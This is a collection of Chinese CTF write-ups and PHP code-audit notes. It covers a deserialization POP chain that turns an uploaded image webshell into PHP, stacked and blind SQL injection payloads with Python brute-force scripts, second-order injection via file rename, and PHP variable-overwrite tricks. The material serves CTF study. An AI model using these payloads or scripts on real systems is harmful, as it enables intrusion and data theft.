    <content type="text"><![CDATA[平台：https://buuoj.cn/challenges 2019 强网杯的题目总结 UPLOADwp大佬的 wp : https://www.zhaoj.in/read-5873.html 个人总结 只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下 本题是 www.tar.gz 泄露，源码泄露总结点击此处 函数流程： 没有登陆时，跳转到 index.php，进行注册登陆。login_check 函数将 cookie(‘user’) 赋给 profile，然后 base64 解码反序列化 在注册页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册 在登陆页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆 已经登陆时，跳转到 index.php/home 进行文件上传操作 在进行上传操作时，对请求头中的 REMOTE_ADDR 进行 md5 加密并赋给 upload_menu ，然后创建以 upload_menu 命名的文件夹 然后进行登陆检查，然后将文件的临时副本的名称赋给 filename_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename 然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0 如果后缀是 png，检查图片内容，然后将 filename 赋给 filename_tmp，将图片相对路径赋给 img，执行 update_img 函数 update_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，并执行 update_cookie 函数 update_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user profile 的 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。__get 会直接从 except 里找，__call 会调用自身的 name 成员变量所指代的变量所指代的方法。 攻击流程： 注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图 解码后如图 选择上传图片，这个图片就是合成的图片马，从 阿里巴巴矢量图库 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error 上传图片之后，会在 upload 目录下生成一个 md5(REMOTE_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie[‘user’] 如图 解码后如图 使用 poc 生成的序列化结果修改 cookie[‘user’]，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 __get 函数中定义了如果调用 index() 就去调用 img，而 __call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。 最后直接用蚁剑连接 shell，读取配置文件中的数据库信息，选择 mysqli 驱动连接到数据库，即可读取 flag 最终 poc 如下，修改上传图片地址即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace app\web\controller;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125;class Register&#123; public $checker; public $registed; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125;$profile = new Profile();$profile-&gt;except = ['index' =&gt; 'img'];$profile-&gt;img = "upload_img";$profile-&gt;ext = "png";//修改地址即可$profile-&gt;filename_tmp = "../public/upload/24ff17b3e72d90d210f3455327ea52f7/36a767e7b2d8d3bde3f881217a418ebb5.png";$profile-&gt;filename = "../public/upload/24ff17b3e72d90d210f3455327ea52f7/6a767e7b2d8d3bde3f881217a418ebb5.php";$register = new Register();$register-&gt;registed = false;$register-&gt;checker = $profile;echo urlencode(base64_encode(serialize($register)));?&gt; mysqli 是 PHP 驱动数据库的一种方式，以前是使用 mysql 的，而 mysqli 相比于 mysql 更加安全高效 copy(a, b)，a 和 b 是文件路径，将文件从 a 拷贝到 b，比如 copy(“./1.png”, “./1.php” ) 执行之后会存在两个文件 1.png 和 1.php unlink(a)，a 是文件路径，删除文件 a 随便注wp 打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了 输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 . return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject); 测试一下有没有注入。?inject=1&#39;%23，返回正常，字符型注入 过滤了这么多关键词，尝试堆叠注入。?inject=1&#39;;show databases;%23，看到了所有的数据库 再看一下所有的表。?inject=1&#39;;show tables;%23，1919810931114514 表和 words 表 flag 在全数字的表里，默认查询的是 words 表 12?inject=1&apos;;show columns from `1919810931114514`;%23?inject=1&apos;;show columns from `words`;%23 既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了 构造 payload 如下 1/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23 使用 /?inject=1&#39; or &#39;1&#39;=&#39;1 访问一下即可获得 flag 个人总结 MySQL中反引号和单引号的区别与用法 MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等 引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即字段值 例如：select * from `username` where `name`=”peri0d” PHP 代码推测，这里只是一个大概的流程，和实际可能有出入。参照 sqli-labs 里的代码 1234567891011121314151617181920212223242526272829303132333435&lt;?phpfunction waf($inject)&#123;preg_match("/select|update|delete|drop|insert|where|\./i",$inject); die('return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);');&#125;if(isset($_GET['inject']))&#123; $id = $_GET['inject']; waf($id); $con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname); $sql = "select * from `words` where id = '$id';"; /* execute multi query */ if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ $result = mysqli_multi_query($con1); if ($result) &#123; if($row = mysqli_fetch_row($result)) &#123; var_dump($row); &#125; &#125; /* print divider */ if (mysqli_more_results($con1)) &#123; echo "&lt;hr&gt;"; &#125; &#125; mysqli_close($con1);&#125;?&gt; MySQL 的 show、rename 和 alter 命令 show 可以用于查看当前数据库，当前表，以及表中的字段 rename 用于修改 table 的名称 alter 用于修改表中字段的属性 攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了 高明的黑客]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>QWB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计基础]]></title>
    <url>%2F2019%2F06%2F03%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[代码审计入门的小总结 常见 PHP 框架 ThinkPHP Yaf Laravel Kohana Codelgniter Yii Smyfony doitphp 先看用户手册 处理流程获取请求 =》全局过滤 =》模块文件 =》C函数内容 =》M函数内容 =》V显示 网站目录结构 主目录 模块目录 插件目录 上层目录 模板目录 数据目录 配置目录 配置文件 公共函数文件 安全过滤文件 数据库结构 入口文件 常见方法通读原文 函数集文件 配置文件 安全过滤文件 index 文件 适用于比较小的网站或者 CMS 敏感关键字回溯参数这是常见方法，但是不能了解程序的基本框架，覆盖不了逻辑漏洞 查找可控变量 可控变量 进入函数的变量 功能点定向审计 程序安装 文件上传 文件管理 登陆验证 备份恢复 找回密码 PHP核心配置语法 大小写敏感 运算符：|, &amp;, ~, ! 空值：foo = ; 或者 foo = none; 安全模式 安全模式 safe_mode = off 限制文档的存取，限制环境变量的存取，控制外部程序的执行 在 PHP5.4.0 被移除 限制环境变量存取 safe_mode_allowed_env_vars = string 指定 PHP 程序可以改变的环境变量的前缀 外部程序执行目录 safe_mode_exec_dir = &quot;path&quot; 禁用函数 disable_functions = 控制变量 全局变量注册开关 register_globals = off off 时服务端使用 $_GET[‘name’] 获取数据，on 时服务端通过 POST 或 GET 提交的数据将使用全局变量来接收 魔术引号自动过滤 magic_quotes_gpc = on 在 PHP5.4.0 被移除 远程文件 是否允许包含远程文件 allow_url_include = off 是否允许打开远程文件 allow_url_open = off 目录权限 HTTP 头部版本信息 expose_http = off 文件上传临时目录 upload_tmp_dir = 用户可访问目录 open_basedir = path 错误信息 内部错误选项 display_errors = on 错误报告级别 error_reporting = E_ALL&amp;~E_NOTICE 审计中涉及的超全局变量 全局变量 在函数外面定义的变量，不能在函数中直接使用。在函数中使用时加上global 超全局变量 作用域在所有脚本，比如$_GET，$_SERVER。除$_GET, $_POST, $_SERVER, $_COOKIE等之外的超全局变量保存在 $GLOBALS 数组中 $GLOBALS global 定义全局变量，只应用于当前网页而不是整个网站，可以视为参数的传递 $GLOBALS 在 PHP 脚本中的任意位置访问全局变量，可以视为变量的作用域设置全局 1234567891011121314151617&lt;?php$var1 = 1;$var2 = 2;function test1()&#123; $GLOBALS['var1'] = $GLOBALS['var2'];&#125;test1();echo $var1; //2function test2()&#123; global $var1,$var2; $var1 = $var2&#125;test2();echo $var1; //2?&gt; $_POST 和 $_GET POST 隐藏传参，将表单内各个字段与其内容放在 Request Header 内传给服务器 GET URL 传参，将参数放在提交表单的 ACTION 属性所指的 URL 中 $_REQUEST PHP 中 $_REQUEST 可以获取 以 POST 和 GET 方法提交的数据 尽量不要使用 $_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。 数组 $_FILE 保存上传文件的信息 数组 $_SESSION 保存 SESSION 信息 数组 $_COOKIE 保存 COOKIE 信息 数组 $_ENV 包含服务器环境变量的数组 只是被动的接受服务器端的环境变量转换为数组 变量覆盖 变量未初始化，我们自定义的参数值可以替换程序原有的变量值 $$12345678&lt;?php$x = '123';$b = '456';$x = $_GET['x'];eval("var_dump($$x);");eval("var_dump($x);");?&gt; 变量 x 初始化为 ‘123’ 传入参数 ?x=b，$$x 就相当于 $b，这时的输出为 string(3) “456”，string(1) “b” 传入参数 ?x=x=789，$$x 相当于 ${x=789}，这时输出为 int(789)，int(789)，x 值以被覆盖 123456789101112131415161718192021222324&lt;?phpinclude "flag.php";$_403 = "Access Denied";$_200 = "Welcome Admin";if ($_SERVER["REQUEST_METHOD"] != "POST") die("CTF is here :p…");if ( !isset($_POST["flag"]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST["flag"] !== $flag ) die($_403);echo "This is your flag : ". $flag . "\n";die($_200);?&gt; payload：?_200=flag post：flag=1 通过 $$key=$$value 将 flag 的值赋给 _200，post 中的 flag 为：${flag}=1，所以 post 的值永远和 $flag 相同，接着利用 die($_200) 将真实的 flag 输出 extract() extract(array,extract_rules,prefix) extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，创建这些变量。该函数返回成功设置的变量数目。 extract_rules 参数： EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。 EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。 EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。 12345678&lt;?php$a = "Original";$my_array = array("a" =&gt; "Cat", "b" =&gt; "Dog", "c" =&gt; "Horse");echo $a;extract($my_array);echo "\$a = $a; \$b = $b; \$c = $c";//Original $a = Cat; $b = Dog; $c = Horse?&gt; 12345678&lt;?phpif($_SERVER["REQUEST_METHOD"]=="POST")&#123; extract($_POST); if($pass == $password_hard)&#123; echo "peri0d".'&lt;br&gt;'; &#125;&#125;?&gt; payload：post：pass=123&amp;password_hard=123 传入的 $_POST 是一个数组，为 array(2) {[&quot;pass&quot;]=&gt;string(3) &quot;123&quot; [&quot;password_hard&quot;]=&gt;string(3) &quot;123&quot;} parse_str() parse_str(string,array) parse_str() 函数把查询字符串解析到变量中。如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。 1234567&lt;?php$name = 'peri0d';parse_str('name=peri0d_2&amp;sex=1');echo $name."&lt;br&gt;";echo $sex;//peri0d_2 1?&gt; 1234567891011121314151617&lt;?phpif(empty($_GET['x']))&#123; show_source(__FILE__); die();&#125;else&#123; include('flag.php'); $m = "guest"; $x = $_GET['x']; @parse_str($x); if($m[0] == "admin")&#123; echo $flag; &#125;else&#123; exit("so easy!"); &#125;&#125;?&gt; payload：?x=m[0]=admin parse_str($x) 即为 parse_str(m[0]=admin)，实现变量覆盖。 反序列化漏洞序列化和反序列化 序列化：把一个复杂的数据类型压缩为一个字符串 反序列化：把一个字符串恢复成复杂的数据类型 12345678&lt;?php$x = &quot;peri0d 2019&quot;;$y = array(&quot;peri0d&quot;,2019);echo serialize($x).&apos;&lt;br&gt;&apos;;echo serialize($y);//s:11:&quot;peri0d 2019&quot;;//a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;i:2019;&#125;?&gt; 漏洞成因 反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击 unserialize 函数的变量可控 php 文件存在可利用的类，类中有魔术方法 序列化的不同结果 public private protect 12345678910&lt;?phpclass test&#123; private $x = "peri0dx"; public $y = "peri0dy"; protected $z = "peri0dz";&#125;$t = new test();echo serialize($t);//O:4:"test":3:&#123;s:7:"testx";s:7:"peri0dx";s:1:"y";s:7:"peri0dy";s:4:"*z";s:7:"peri0dz";&#125;?&gt; 魔术方法 construct() : 当一个类被创建时自动调用 destruct() : 当一个类被销毁时自动调用 invoke() : 当把一个类当作函数使用时自动调用 toString() : 当把一个类当作字符串使用时自动调用 wakeup() : 当调用unserialize()函数时自动调用 sleep() : 当调用serialize()函数时自动调用 call() : 当要调用的方法不存在或权限不足时自动调用 get() : 这个方法用来获取私有成员属性值的,有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值 set() : 将数据写入不可访问属性 例子CVE-2016-7124 弱类型变量类型 标准类型：布尔，整型，浮点，字符 复杂类型：数据，对象 特殊类型：资源 操作之间的比较 字符串和数字 123456&lt;?phpvar_dump(0 == "admin"); //Tvar_dump("1admin" == 1); //Tvar_dump("admin1" == 1); //Fvar_dump("admin1" == 0); //T?&gt; 数字和数组 12345&lt;?php$arr = array();var_dump(0 == $arr); //Fvar_dump(123 == $arr); //F?&gt; 字符串和数组 12345&lt;?php$arr = array();var_dump('0' == $arr); //Fvar_dump('123' == $arr); //F?&gt; “合法数字+e+合法数字” 类型的字符串 12345&lt;?phpvar_dump("0e1234" == "0e56789"); //Tvar_dump("1e1123" == "10"); //Fvar_dump("1e1" == "10"); //T?&gt; == 和 === 在PHP里面 == 比较指比较值，不同类型会转换成同一类型比较。用 === 比较时，必须值和类型都一样才为true empty 与 isset 变量为：0, “0”, null, false, array() 时，使用 empty 函数，返回值为 true 变量未定义或为 null 时，isset 函数返回 false，其他都返回 true md5 函数传入数组进行比较时全为 true 12345&lt;?php$arr1 = array('test1', 'test2', '2019');$arr2 = array('test3', 'test4', '2019');var_dump(md5($arr1) == md5($arr2)); //T?&gt; strcmp 函数 strcmp(string1, string2) 比较 string1 和 string2。如果相等返回 0；如果 string1 小于 string2，返回 &lt;0；如果 string1 大于 string2，返回 &gt;0 12345678910&lt;?php$pass = '123456';if(isset($_GET['pwd']))&#123; if(strcmp($_GET['pwd'], $pass) == 0)&#123; echo 'success'; &#125;else&#123; echo 'fail'; &#125;&#125;?&gt; payload：?pwd[]=1 in_array() 与 array_search()in_array() 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE。 bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) array_search() 函数在数组中搜索某个键值，并返回对应的键名。如果在数组中找到指定的键值，则返回对应的键名，否则返回 FALSE。如果在数组中找到键值超过一次，则返回第一次找到的键值所匹配的键名。 array_search(value, array, strict) switch如果 switch 是数字类型的 case 判断时，switch 会将参数转换为 int 类型 伪协议file:// 用于访问本地系统文件，不受 allow_url_fopen 和 allow_url_include 影响 常与文件包含结合在一起使用 php://filter 读取源代码并以base-64编码形式输出，不受 allow_url_fopen 和 allow_url_include 影响 常与文件包含结合在一起使用 经典用法：?file=php://filter/read=convert.base64-encode/resource=./index.php php://input 可以访问请求的原始数据的只读流，allow_url_include 为 on 时可以使用，不受 allow_url_fopen 影响 会话认证漏洞 Session 固定攻击 Session 劫持攻击 通常出现在 cookie 验证上，通常不使用 session 认证 Session 劫持攻击 获取用户的 session id，然后修改数据 Session 固定攻击 用户使用了黑客发送的 session id，网站就不会给用户发送 session id]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蓝鲸安全打卡Web分析]]></title>
    <url>%2F2019%2F06%2F01%2F%E8%93%9D%E9%B2%B8%E6%89%93%E5%8D%A1Web%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[蓝鲸打卡的一个 web 文件上传引发二次注入的题解和思考 蓝鲸文件管理系统源代码地址：http://www.whaledu.com/course/290/task/2848/show 首先在设置文件里把所有的输入都采用 addslashes() 函数进行转义 upload.php关键代码将上传的文件通过pathinfo()函数分成三个部分，[dirname] [filename] [extension] 然后进行后缀名检查，拼接后进行addslashes转义，查询是否存在这个文件 123456789101112131415161718if($file["error"] == UPLOAD_ERR_OK) &#123; $name = basename($file["name"]); $path_parts = pathinfo($name); if(!in_array($path_parts["extension"], array("gif", "jpg", "png", "zip", "txt"))) &#123; exit("error extension"); &#125; $path_parts["extension"] = "." . $path_parts["extension"]; $name = $path_parts["filename"] . $path_parts["extension"]; $path_parts['filename'] = addslashes($path_parts['filename']); $sql = "select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"; $fetch = $db-&gt;query($sql); if($fetch-&gt;num_rows&gt;0) &#123; exit("file is exists"); &#125; 将文件名和后缀名插入数据库，将文件移动到相应文件夹并返回路径 12345678910111213141516if(move_uploaded_file($file["tmp_name"], ROOT . UPLOAD_DIR . $name)) &#123; $sql = "insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"; $re = $db-&gt;query($sql); if(!$re) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $url = "/" . UPLOAD_DIR . $name; echo "Your file is upload, url: &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\"/\"&gt;go back&lt;/a&gt;"; &#125; else &#123; exit("upload error"); &#125; rename.php关键代码查询旧文件是否存在 1234567if(isset($req['oldname']) &amp;&amp; isset($req['newname'])) &#123; $result = $db-&gt;query("select * from `file` where `filename`='&#123;$req['oldname']&#125;'"); if ($result-&gt;num_rows&gt;0) &#123; $result = $result-&gt;fetch_assoc(); &#125;else&#123; exit("old file doesn't exists!"); &#125; 更新filename，将oldname和newname重组，查询oldname是否存在，然后将文件的oldname更新为newname 12345678910111213141516171819if($result) &#123; $req['newname'] = basename($req['newname']); $re = $db-&gt;query("update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"); if(!$re) &#123; print_r($db-&gt;errorInfo()); exit; &#125; $oldname = ROOT.UPLOAD_DIR . $result["filename"].$result["extension"]; $newname = ROOT.UPLOAD_DIR . $req["newname"].$result["extension"]; if(file_exists($oldname)) &#123; rename($oldname, $newname); $url = "/" . $newname; echo "Your file is rename, url: &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\"/\"&gt;go back&lt;/a&gt;"; &#125; else&#123;echo $oldname." not exists.";&#125;&#125; 解题思路在upload的过程中，全程进行转义并检测后缀，无法对上传进行操作，但是在rename的时候，没有对newname进行控制，这就可能会造成update的二次注入。 假设我们上传的文件是 1.jpg，然后进行改名，这个时候就会触发数据库的update语句 update `file` set `filename`=’newname’, `oldname`=’1’ where `fid`=fid 很明显，这里的newname和oldname都是我们可以控制的。 考虑上传问题，假设 1.jpg 是一句话木马，要把 1.jpg 变成 1.php，由于filename和extension分开操作，然后再合并，所有这里希望extension为空，这样在rename时可以将 1.jpg 变成 1.php。 构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.php，发现结果为 1.php.jpg 解释： 文件 ‘,extension=’’,filename=’1.jpg.jpg 上传后的数据库如下 注意，rename过程中进行查询时，查询的结果 result[‘fid’] = 1，result[‘extension’] = ‘jpg’ 然后进行update，这时执行了构造的SQL语句，数据库如下 注意这两行代码 12$oldname = ROOT.UPLOAD_DIR . $result["filename"].$result["extension"];$newname = ROOT.UPLOAD_DIR . $req["newname"].$result["extension"]; 在这个过程中，oldname=’,extension=’’,filename=’1.jpg.jpg，newname=1.php.jpg，由于oldname存在，所以最后变成1.php.jpg 解决构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.jpg，结果为 1.jpg.jpg 构造另外一个一句话木马文件1.jpg，上传，数据库如下 再进行rename，传入的oldname为 1.jpg，newname为 1.php 进行查询的结果为 result[‘fid’] = 1，result[‘extension’] = ‘’ 在最后的过程中，oldname = 1.jpg，newname = 1.php，这样就把上传的 1.jpg 变成了 1.php]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>whale CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻防世界Web新手]]></title>
    <url>%2F2019%2F06%2F01%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E6%96%B0%E6%89%8B%2F</url>
    <content type="text"><![CDATA[攻防世界入门的题目 view source禁用右键，F12审查元素 get posthackbar进行post robots直接访问robots.txt，发现f1ag_1s_h3re.ph文件，直接访问 backup备份文件一般是在后缀名后加.swp，.bak 本题尝试index.php.bak成功获取源码 cookieburp抓包，发现提示，查看cookie.php，在响应头发现flag 火狐，F12，网络，cookie可以看到提示，访问之后再看响应头即可 disabled_buttonF12审查元素，找到按钮对应的代码，发现disabled=””，具体属性可以查看w3school，删除这个属性即可。 simple_js拿到js源码，根据分析可以知道，函数 dechiffre(pass_enc) 的返回值与传入参数无关 根据\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30，替换\x为%，再URLdecode一下，得到55,56,54,79,115,69,114,116,107,49,50，Firefox控制台运行一下 xff_refererburp改包 weak_auth审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可。但是这里我直接尝试admin，123456就登陆了，弱密码。 webshell直接使用蚁剑 command_execution关于命令执行，windows或linux下: command1 &amp;&amp; command2 先执行command1后执行command2 command1 | command2 只执行command2 command1 &amp; command2 先执行command2后执行command1 本题先使用ls不断遍历目录，查找flag，最后再读取 simple_php看到源码，考察php弱类型 123456789101112131415&lt;?phpshow_source(__FILE__);include("config.php");$a=@$_GET['a'];$b=@$_GET['b'];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; == 比较var_dump(‘a’ == 0) //truea会被转化为数字0var_dump(‘1234a’ == 1234) //true这里’1234a’会被转化为1234 === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。== 在进行比较的时候，会先将字符串类型转化成相同，再比较。 在$a==$b的比较中 1234$a=' ';$b=null //true$a=null;$b=true //true$a=0;$b='0' //true$a=0;$b='abcdef ' //true 而0===’abcdef ' false 总结 F12常开着 burp常开着 试试访问robots.txt 备份文件一般是在后缀名后加.swp，.bak 蚁剑是有两个部分的，一个是启动程序，一个是源码 php的弱类型]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JACTF Web部分]]></title>
    <url>%2F2019%2F06%2F01%2FJACTF-Web%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[掘安团队的题目 平台已不运营 Web签到 发现请求URL为flag.php，但是会跳转到404.php页面，抓包发现有302重定向，查看响应包，flag经过base64编码，解码即可 Tips： 重定向分为301和302两种 301为永久性 302为暂时性 下载下载 直接请求?file=flag.php，获取源码，直接使用解密函数即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpheader('Content-Type: text/html; charset=utf-8'); //网页编码function encrypt($data, $key) &#123; $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= $key &#123;$x&#125;; $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; $str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % 256 ); &#125; return base64_encode ( $str );&#125;function decrypt($data, $key) &#123; $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= substr ( $key, $x, 1 ); $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) &#123; $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); &#125; else &#123; $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); &#125; &#125; return $str;&#125;$key="MyCTF";$flag="o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=";//encrypt($flag,$key);//添加下面的语句即可echo decrypt($flag,$key);?&gt; 该网站已被黑 御剑扫描一波 登入shell.php 可以使用burp暴力破解，密码为hack 曲折的人生看到一个登陆页面，随便输入 有返回报错信息，可以构造or语句，获取登陆密码和用户名 1select id,username,password from `admin` where username=&apos;admin&apos;用户名:admin不正确 构造如下 1select id,username,password from `admin` where username=&apos;&apos; or ascii(substr((select password from `admin` limit 0,1),1,1))&gt;1 # &apos;&apos; 写个脚本Fuzz一下 12345678910111213141516import requestsfrom bs4 import BeautifulSoupurl = 'http://120.79.1.69:10005/index.php?check'uname_list = [' ', 'select', 'or', 'and', 'union', '\'', 'from', '\\', '#', '--', '+']for i in uname_list: data = &#123;'username':i&#125; result = requests.post(url=url, data=data) soup = BeautifulSoup(result.text,'lxml') links = soup.find_all('div', class_='tip') for j in links: print(i + " 结果 " + j.get_text()) print('************************************') 可以知道，空格，select，or，union被过滤，但是可以采取重写方式绕过，空格采取/**/方式绕过 注入脚本 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsfrom bs4 import BeautifulSoupurl = 'http://120.79.1.69:10005/index.php?check'password = []#s = "'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))=3/**/#'"#判断长度for i in range(0,100): s = "'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))="+str(i)+"/**/#'" data = &#123;'username':s&#125; result = requests.post(url=url, data=data) if('goodboy' in result.text): print(i) length_pass = i soup = BeautifulSoup(result.text,'lxml') links = soup.find_all('div', class_='tip') for x in links: print(" 结果 " + x.get_text()) print('************************************') break#s = "'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),1,1))&gt;1/**/#'"#判断内容l = 1for i in range(1,length_pass+1): for j in range(32,127): s = "'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),"+str(i)+",1))"+"="+str(j)+"/**/#'" data = &#123;'username':s&#125; result = requests.post(url=url, data=data) if('goodboy' in result.text): print("第" + str(l) + "次") l = l + 1 password.append(chr(int(j))) continueprint(''.join(password))#ajahas&amp;&amp;*44askldajaj#goodboy_g-60Hellowor 这里过滤了or 应输入 goodboy_g-60Hellowoorr 快速计算脚本 123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupurl = 'http://120.79.1.69:10005/index.php'sess = requests.Session()r = sess.get(url=url)soup = BeautifulSoup(r.text,'lxml')links = soup.find_all('div', class_='rep')for i in links: s = i.get_text() s = s.replace('（','(')s = s.replace('）',')')s = s.replace('X','*')print(s)num = eval(s)print(num)urls = 'http://120.79.1.69:10005/index.php?check'password = 'ajahas&amp;&amp;*44askldajaj'uname = 'goodboy_g-60Hellowoorr'data = &#123;'username':uname, 'password':password, 'code':num&#125;res = sess.post(url=urls, data=data)print(res.text) 得到的响应，一个压缩包，也给出了解压密码 解压之后，有一个加密的flag.zip，Form1.txt给出了解密方法，python脚本破解一下，结果是VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk 123456789101112re_string = 